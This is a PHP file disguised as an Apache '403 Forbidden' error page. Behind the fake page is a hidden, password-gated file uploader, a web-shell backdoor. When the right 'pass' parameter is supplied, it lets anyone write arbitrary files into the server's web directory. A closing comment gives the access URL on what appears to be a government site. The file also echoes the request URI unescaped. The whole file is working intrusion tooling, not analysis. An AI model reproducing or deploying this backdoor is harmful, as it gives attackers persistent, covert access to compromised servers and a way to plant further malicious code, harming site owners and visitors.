<?php
echo "<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access ".$_SERVER['REQUEST_URI']."  on this server.</p>
<p>Additionally, a 403 Forbidden
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>";if(isset($_POST['uploaded'])){$file=$_FILES['files']['name'];$files=$_FILES['files']['tmp_name'];$folder="";if(move_uploaded_file($files,$folder.$file)){$result="Uploaded : => <a href='$file' target='_blank'>Your file here</a>";}else {$result="Failed to upload...!";}}$password="aqilogic";if($_GET['pass']==$password){echo '<br /><br /><br /><html><head><title>aqilogic Uploader</title></head><body><center><form action="" method="post" enctype="multipart/form-data">
<input type="file" name="files" />
<input type="submit" name="uploaded" value="Upload">
</form>'.$result.'</center></body></html>';}?>


<!--https://site.go.id/uploader.php?pass=aqilogic-->
